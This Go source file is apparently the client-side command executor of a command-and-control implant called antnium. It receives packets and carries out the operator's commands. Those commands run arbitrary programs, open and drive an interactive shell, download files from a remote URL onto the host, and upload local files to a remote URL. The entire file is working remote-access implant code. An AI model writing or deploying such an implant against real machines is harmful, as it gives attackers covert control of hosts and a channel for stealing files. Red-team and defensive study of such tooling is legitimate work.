package client

import (
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"

	"github.com/dobin/antnium/model"
	log "github.com/sirupsen/logrus"
)

type PacketExecutor struct {
	interactiveShell InteractiveShell
}

func MakePacketExecutor() PacketExecutor {
	interactiveShell := makeInteractiveShell()
	packetExecutor := PacketExecutor{
		interactiveShell,
	}
	return packetExecutor
}

func (s *PacketExecutor) execute(packet *model.Packet) error {
	log.WithFields(log.Fields{
		"packet": packet,
	}).Info("Execute")

	if packet.Command == "ping" {
		packet.Response = s.actionPing(packet.Arguments)
	} else if packet.Command == "test" {
		packet.Response = s.actionTest(packet.Arguments)
	} else if packet.Command == "exec" {
		packet.Response = s.actionExec(packet.Arguments)
	} else if packet.Command == "fileupload" {
		packet.Response = s.actionFileupload(packet.Arguments)
	} else if packet.Command == "filedownload" {
		packet.Response = s.actionFiledownload(packet.Arguments)

	} else if packet.Command == "iOpen" {
		packet.Response = s.actionInteractiveShellOpen(packet.Arguments)
	} else if packet.Command == "iIssue" {
		packet.Response = s.actionInteractiveShellIssue(packet.Arguments)

	} else {
		packet.Response["response"] = "packet not found: " + packet.Command
	}

	return nil
}

func (s *PacketExecutor) actionInteractiveShellOpen(packetArgument model.PacketArgument) model.PacketResponse {
	ret := make(model.PacketResponse)
	_, force := packetArgument["force"]

	if s.interactiveShell.AlreadyOpen() && !force {
		ret["error"] = "already_open"
	} else {
		if s.interactiveShell.AlreadyOpen() {
			s.interactiveShell.execCmd.Process.Kill()
		}
		stdout, stderr, err := s.interactiveShell.open()

		ret["stdout"] = stdout
		ret["stderr"] = stderr
		if err != nil {
			ret["error"] = err.Error()
		}
	}

	return ret
}
func (s *PacketExecutor) actionInteractiveShellIssue(packetArgument model.PacketArgument) model.PacketResponse {
	ret := make(model.PacketResponse)

	// Check and transform input
	commandline, ok := packetArgument["commandline"]
	if !ok {
		ret["error"] = "No commandline given"
		return ret
	}

	stdout, stderr := s.interactiveShell.issue(commandline)

	ret["stdout"] = stdout
	ret["stderr"] = stderr

	return ret
}

func (s *PacketExecutor) actionPing(packetArgument model.PacketArgument) model.PacketResponse {
	ret := make(model.PacketResponse)
	ret["response"] = "ping answer"
	return ret
}

func (s *PacketExecutor) actionTest(packetArgument model.PacketArgument) model.PacketResponse {
	ret := make(model.PacketResponse)
	ret["response"] = "test answer"
	return ret
}

func (s *PacketExecutor) actionExec(packetArgument model.PacketArgument) model.PacketResponse {
	ret := make(model.PacketResponse)

	// Check and transform input
	executable, args, err := model.MakePacketArgumentFrom(packetArgument)
	if err != nil {
		ret["error"] = err.Error()
		return ret
	}

	// Execute and return result
	log.Infof("Executing: %s %v", executable, args)
	packet := exec.Command(executable, args...)
	stdout, err := packet.Output()
	if err != nil {
		// If program didnt exit nicely
		ret["error"] = err.Error()
	} else {
		ret["stdout"] = windowsToString(stdout)
	}
	return ret
}

func (s *PacketExecutor) actionFiledownload(packetArgument model.PacketArgument) model.PacketResponse {
	ret := make(model.PacketResponse)

	// Check and transform input
	remoteurl, ok := packetArgument["remoteurl"]
	if !ok {
		ret["error"] = "No remoteurl given"
		return ret
	}
	destination, ok := packetArgument["destination"]
	if !ok {
		ret["error"] = "No destination given"
		return ret
	}

	// Download and write file
	resp, err := http.Get(remoteurl)
	if err != nil {
		ret["error"] = err.Error()
		return ret
	}
	defer resp.Body.Close()
	out, err := os.Create(destination)
	if err != nil {
		ret["error"] = err.Error()
		return ret
	}
	defer out.Close()
	written, err := io.Copy(out, resp.Body)
	if err != nil {
		ret["error"] = err.Error()
		return ret
	}

	ret["response"] = fmt.Sprintf("Written %d bytes", written)
	return ret
}

func (s *PacketExecutor) actionFileupload(packetArgument model.PacketArgument) model.PacketResponse {
	ret := make(model.PacketResponse)

	// Check and transform input
	remoteurl, ok := packetArgument["remoteurl"]
	if !ok {
		ret["error"] = "No remoteurl given"
		return ret
	}
	source, ok := packetArgument["source"]
	if !ok {
		ret["error"] = "No source given"
		return ret
	}

	client := &http.Client{}
	data, err := os.Open(source)
	if err != nil {
		ret["error"] = err.Error()
		return ret
	}
	req, err := http.NewRequest("POST", remoteurl, data)
	if err != nil {
		ret["error"] = err.Error()
		return ret
	}
	resp, err := client.Do(req)
	if err != nil {
		ret["error"] = err.Error()
		return ret
	}
	_, err = ioutil.ReadAll(resp.Body)
	if err != nil {
		ret["error"] = err.Error()
		return ret
	}

	ret["response"] = fmt.Sprintf("Status: %s", resp.Status)
	return ret
}
